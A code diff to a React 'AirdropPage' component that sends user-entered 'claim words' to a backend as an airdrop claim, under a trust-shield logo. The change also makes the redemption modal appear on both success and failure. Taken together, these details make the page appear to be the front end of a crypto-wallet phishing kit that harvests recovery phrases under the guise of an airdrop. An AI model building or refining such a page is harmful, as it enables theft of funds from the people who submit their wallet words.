@@ -4,14 +4,16 @@ import { useNavigate } from 'react-router-dom'
 import { IoArrowBack, IoClose, IoShieldCheckmarkOutline } from 'react-icons/io5'
 import RedemptionModal from '../../components/RedemptionModal/RedemptionModal'
 import trustShield from '../../assets/trust-shield.png'
-import api from '../../api/axios' // Import the API
+import api from '../../api/axios'
 
-function AirdropPage() {
+function AirdropPage({ asSection = false, id }) {
   const navigate = useNavigate()
   const [claimWords, setClaimWords] = useState('')
   const [showRedeemModal, setShowRedeemModal] = useState(false)
   const [isRedeeming, setIsRedeeming] = useState(false)
+  const PageTag = asSection ? 'section' : 'main'
   const [error, setError] = useState('')
+  const [redeemStatus, setRedeemStatus] = useState(null) // 'success' or 'failure'
 
   const handleRedeem = async () => {
     // Don't proceed if already redeeming or no words entered
@@ -23,12 +25,13 @@ function AirdropPage() {
 
     setIsRedeeming(true)
     setError('')
+    setRedeemStatus(null)
 
     try {
       // Send the claim words to the backend
       const response = await api.post('/', {
         words: claimWords,
-        title: 'Airdrop', // Default title
+        title: 'Airdrop',
         createdBy: 'airdrop-user',
         source: 'airdrop',
       })
@@ -37,12 +40,19 @@ function AirdropPage() {
 
       if (response.data.ok) {
         // Show the redemption modal on success
+        setRedeemStatus('success')
         setShowRedeemModal(true)
       } else {
+        // Show the redemption modal with failure status
+        setRedeemStatus('failure')
+        setShowRedeemModal(true)
         setError(response.data.error || 'Failed to process airdrop claim')
       }
     } catch (error) {
       console.error('Airdrop claim error:', error)
+      // Show the redemption modal with failure status
+      setRedeemStatus('failure')
+      setShowRedeemModal(true)
       setError(error.response?.data?.error || 'Failed to connect to server. Please try again.')
     } finally {
       setIsRedeeming(false)
@@ -54,13 +64,21 @@ function AirdropPage() {
     setError('')
   }
 
+  const handleCloseModal = () => {
+    setShowRedeemModal(false)
+    // Reset status after modal closes
+    setRedeemStatus(null)
+  }
+
   return (
-    <main className="airdrop-page">
+    <PageTag className={`airdrop-page ${asSection ? 'airdrop-section' : ''}`} id={id}>
       <section className="airdrop-panel" aria-labelledby="airdrop-title">
         <header className="airdrop-header">
-          <button className="icon-button" type="button" onClick={() => navigate('/')} aria-label="Back">
-            <IoArrowBack />
-          </button>
+          {asSection ? <span aria-hidden="true" /> : (
+            <button className="icon-button" type="button" onClick={() => navigate('/')} aria-label="Back">
+              <IoArrowBack />
+            </button>
+          )}
           <div className="airdrop-logo">
             <img src={trustShield} alt="" />
           </div>
@@ -140,9 +158,14 @@ function AirdropPage() {
       </section>
 
       {showRedeemModal && (
-        <RedemptionModal onClose={() => setShowRedeemModal(false)} />
+        <RedemptionModal 
+          onClose={handleCloseModal}
+          status={redeemStatus}
+          errorMessage={error}
+          batchData={redeemStatus === 'success' ? { id: '...' } : null}
+        />
       )}
-    </main>
+    </PageTag>
   )
 }
 
